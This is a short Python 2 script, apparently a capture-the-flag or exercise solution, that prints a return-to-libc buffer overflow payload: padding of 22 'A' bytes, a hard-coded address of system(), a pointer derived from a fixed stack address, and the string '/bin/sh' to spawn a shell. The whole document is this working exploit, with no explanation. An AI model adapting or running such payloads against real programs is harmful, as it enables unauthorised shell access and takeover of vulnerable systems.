from struct import pack

system = 0x08048eed;
ebp = 0xbffe9988;

print 'A'*(18+4) + pack('<I', system) + pack('<I', ebp+12) + "/bin/sh"


